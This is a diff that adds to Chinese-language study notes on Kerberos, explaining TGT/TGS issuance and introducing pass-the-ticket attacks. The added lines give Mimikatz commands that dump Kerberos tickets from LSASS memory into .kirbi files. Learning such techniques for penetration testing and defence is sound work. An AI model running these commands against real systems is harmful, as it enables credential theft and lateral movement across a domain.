@@ -425,7 +425,14 @@ Kerberos 基于票据
 一旦域控制器验证了用户的身份（ 域控制器知道用户的密码哈希，它可以解密时间戳），它就会向用户发送一个 TGT
 例如，用户想要连接到 MSSQL 数据库，它会向密钥分发中心 (Key Distribution Center, KDC) 出示其 TGT，请求一个 TGS，将 TGS 提供给 MSSQL 数据库服务器进行身份验证
 
+在执行票据传递 (PtT) 攻击之前，使用 Mimikatz 或 Rubeus 获取票据
+票据由 LSASS (本地安全机构子系统服务, Local Security Authority Subsystem Service) 进程处理和存储
 
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+mimikatz # exit
+c:\tools> dir *.kirbi
 
 
 
